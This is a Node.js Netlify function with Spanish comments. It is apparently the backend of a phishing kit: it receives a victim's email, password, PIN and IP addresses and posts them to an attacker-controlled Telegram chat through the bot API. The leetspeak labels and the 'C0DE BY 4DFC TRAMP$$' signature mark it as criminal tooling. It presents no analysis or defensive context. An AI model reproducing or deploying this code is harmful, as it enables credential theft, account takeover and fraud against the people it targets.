const fetch = require("node-fetch");

exports.handler = async function(event, context) {
    const { email, password, pin, ip, ip2 } = JSON.parse(event.body);

    // El token y el chat id se obtienen de variables de entorno en Netlify
    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
        return {
            statusCode: 500,
            body: "Faltan las variables de entorno de Telegram"
        };
    }

    const message = `📧EMAIL: ${email}\n🔒Cl4v3: ${password}\n📌P1N: ${pin}\nIP: ${ip}\n${ip2}\n\n C0DE BY 4DFC TRAMP$$ 👨🏻‍💻🥷🏻`;
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });
        return {
            statusCode: 200,
            body: "Enviado"
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: "Error al enviar: " + error.toString()
        };
    }
};